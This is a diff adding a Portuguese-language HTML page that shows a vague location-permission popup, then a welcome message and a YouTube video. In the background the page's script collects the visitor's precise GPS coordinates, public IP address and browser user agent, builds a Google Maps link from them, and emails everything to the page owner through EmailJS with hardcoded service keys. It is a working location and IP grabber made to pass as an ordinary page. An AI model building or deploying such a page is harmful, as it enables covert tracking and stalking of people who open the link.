@@ -1,1 +1,175 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <title>Captura de Localização</title>
+  <style>
+    html, body {
+      margin: 0;
+      padding: 0;
+      font-family: sans-serif;
+      height: 100%;
+      overflow: hidden;
+      background-color: black;
+      color: white;
+    }
+
+    #popup {
+      position: fixed;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      background: rgba(0,0,0,0.85);
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      z-index: 10;
+      text-align: center;
+      padding: 2rem;
+    }
+
+    #popup button {
+      padding: 1rem 2rem;
+      margin-top: 1rem;
+      font-size: 1rem;
+      border: none;
+      border-radius: 6px;
+      background-color: #28a745;
+      color: white;
+      cursor: pointer;
+    }
+
+    #video-bg {
+      position: fixed;
+      top: 0; left: 0;
+      width: 100vw;
+      height: 100vh;
+      z-index: -1;
+      pointer-events: none;
+    }
+
+    #content {
+      position: relative;
+      z-index: 2;
+      padding: 2rem;
+      text-align: center;
+      background-color: rgba(0,0,0,0.5);
+    }
+
+    iframe {
+      width: 100%;
+      height: 100%;
+      border: none;
+      pointer-events: auto;
+    }
+  </style>
+</head>
+<body>
+
+<!-- Popup de consentimento -->
+<div id="popup">
+  <h2>Permitir acesso à sua localização?</h2>
+  <p>Para continuar, precisamos da sua permissão para capturar a localização.</p>
+  <button onclick="permitir()">Permitir</button>
+</div>
+
+<!-- Vídeo de fundo (sem autoplay) -->
+<div id="video-bg" style="display: none;">
+  <iframe id="youtube" src="https://www.youtube.com/embed/dQw4w9WgXcQ?controls=1&mute=0&autoplay=0&rel=0&modestbranding=1" allow="accelerometer; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
+</div>
+
+<!-- Conteúdo principal -->
+<div id="content" style="display: none;">
+  <h1>Bem-vindo!</h1>
+  <p id="location">Carregando localização...</p>
+</div>
+
+<!-- EmailJS -->
+<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+<script>
+  emailjs.init("3nQv9Y-aSYhq53HDi"); // sua chave pública
+</script>
+
+<script>
+  async function permitir() {
+    document.getElementById("popup").style.display = "none";
+    document.getElementById("video-bg").style.display = "block";
+    document.getElementById("content").style.display = "block";
+
+    // Agora podemos capturar dados
+    let latitude = null;
+    let longitude = null;
+    let ip = null;
+    let userAgent = navigator.userAgent;
+    let googleMapsLink = null;
+
+    const obterIP = async () => {
+      try {
+        const res = await fetch("https://api.ipify.org?format=json");
+        const data = await res.json();
+        return data.ip;
+      } catch (e) {
+        return null;
+      }
+    };
+
+    const obterLocalizacao = () => {
+      return new Promise(resolve => {
+        if (!navigator.geolocation) {
+          resolve(null);
+        } else {
+          navigator.geolocation.getCurrentPosition(
+            pos => resolve({
+              latitude: pos.coords.latitude,
+              longitude: pos.coords.longitude
+            }),
+            err => resolve(null),
+            {
+              enableHighAccuracy: true,
+              timeout: 10000,
+              maximumAge: 0
+            }
+          );
+        }
+      });
+    };
+
+    const [ipResult, locResult] = await Promise.all([
+      obterIP(),
+      obterLocalizacao()
+    ]);
+
+    ip = ipResult;
+
+    if (locResult) {
+      latitude = locResult.latitude;
+      longitude = locResult.longitude;
+      googleMapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
+      document.getElementById('location').innerText =
+        `Localização: ${latitude.toFixed(6)}, ${longitude.toFixed(6)}`;
+    } else {
+      document.getElementById('location').innerText =
+        "Localização não permitida ou não capturada.";
+    }
+
+    const params = {
+      latitude: latitude || "Não capturada",
+      longitude: longitude || "Não capturada",
+      google_maps: googleMapsLink || "Não disponível",
+      ip_address: ip || "Não capturado",
+      user_agent: userAgent
+    };
+
+    emailjs.send('service_zrwt5s7', 'template_xcfeb16', params)
+      .then(() => {
+        console.log("E-mail enviado com sucesso.");
+      })
+      .catch(err => {
+        console.error("Erro ao enviar e-mail:", err);
+      });
+  }
+</script>
+
+</body>
+</html>
 
